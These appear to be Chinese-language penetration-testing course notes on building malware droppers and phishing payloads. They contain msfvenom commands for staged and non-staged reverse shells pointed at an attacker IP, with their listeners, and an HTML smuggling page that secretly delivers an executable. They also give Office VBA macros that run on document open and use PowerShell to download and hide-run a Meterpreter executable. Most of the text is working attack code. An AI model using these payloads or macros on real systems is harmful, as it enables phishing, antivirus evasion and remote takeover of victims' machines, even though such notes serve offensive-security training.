# Will You Be My Dropper

## 3.1.1 Staged vs Non-staged Payloads(分段与不分段payload)

```windows/shell_reverse_tcp```，不分段payload（Non-staged），包含所有攻击代码

``` windows/shell/reverse_tcp```，分段payload（Staged），包含执行回调的最少量代码，然后检索任何剩余的代码并在目标内存中执行它。这种精简后的有效载荷不会像非分级有效载荷那样占用大量内存，并且可能会逃避反病毒程序。


Non-staged有效载荷使用```_```

Staged有效载荷使用```/```

## 3.1.2 Building Our Droppers

1. 建造非分段payload：


```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o /var/www/html/shell.exe
```

监听
```
sudo nc -lnvp 444
```

2. 建造分段payload

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
```

监听
```
msf5 exploit(multi/handler) > exploit

[*] Started HTTPS reverse handler on https://192.168.119.120:443
```

## HTML Smuggling

这一节主要是通过js把一个exe通过base64加解密，然后诱使用户从浏览器下载可执行文件，并且执行（chrome浏览器会有可执行文件警告）

编译payload
```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
```

base64解密exe
```
base64 /var/www/html/msfstaged.exe
```

前端下载代码：
```
<html>
    <body>
        <script>
          function base64ToArrayBuffer(base64) {
    		  var binary_string = window.atob(base64);
    		  var len = binary_string.length;
    		  var bytes = new Uint8Array( len );
    		  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    		  return bytes.buffer;
      		}
      		
      		var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
      		var data = base64ToArrayBuffer(file);
      		var blob = new Blob([data], {type: 'octet/stream'});
      		var fileName = 'msfstaged.exe';
      		
      		var a = document.createElement('a');
      		document.body.appendChild(a);
      		a.style = 'display: none';
      		var url = window.URL.createObjectURL(blob);
      		a.href = url;
      		a.download = fileName;
      		a.click();
      		window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>
```

# Phishing with Microsoft Office

## Installing Microsoft Office

安装过程略。。

## VBA 简介

一个运行cmd.exe的宏代码
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

## Let PowerShell Help Us

一个执行powershell的宏代码（将从 Web 服务器中提取 Meterpreter 可执行文件。我们添加了一个小的时间延迟，以允许文件完全下载。然后对用户执行隐藏的文件。这将产生一个反向 Meterpreter shell）
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```